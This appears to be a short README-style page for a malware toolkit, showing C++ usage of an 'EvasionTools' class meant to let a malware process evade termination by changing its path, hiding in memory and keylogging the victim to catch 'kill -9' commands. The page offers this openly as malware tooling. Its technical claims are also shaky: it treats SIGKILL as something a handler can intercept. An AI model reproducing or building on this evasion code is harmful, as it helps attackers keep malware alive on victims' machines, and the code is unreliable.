<h1>This is an example of the PID Changer + Signal Handler in the EvasionTools Class!</h1>
So, The only way you can kill this process is using the SIGKILL or -9, Later Versions, We will add such a function to detect the kill -9 command and avoid it by changing malware location and restarting it back! Like :
<pre>
	EvasionTools 	 Evador;
	RuntimeTools	Malware;


	void Escape(){
		Evador.ChangeMalwareIdentity("/new/malware/path/and/name", RestartMalwareOrNot, KeepOldFileOrNot, ReplaceOldFileWithOrNot);
		Evador.MoveIntoMemory();    			// Will Remove the malware from the hard disk and keep it in the memory in order to hide itself
		Malware.StopFor(300); 				// sleep 300 Seconds
		Evador.MoveBackToDisk();			// Move Back The Malware from memory into disk
		Malware.Exit();					// Exit
	}

	int main(void){

       	        Evador.HandleSigKill( Escape );                      // So This Will Spy on the Vitim's Keyboard and detect if there is a kill -9 malware-pid or killall -9 malware-name will happen then do the work in some nanoseconds (Yeah That's Why i Choosed C++ For This Project because it's performance)! Sounds Crazy HA!
        }
</pre>

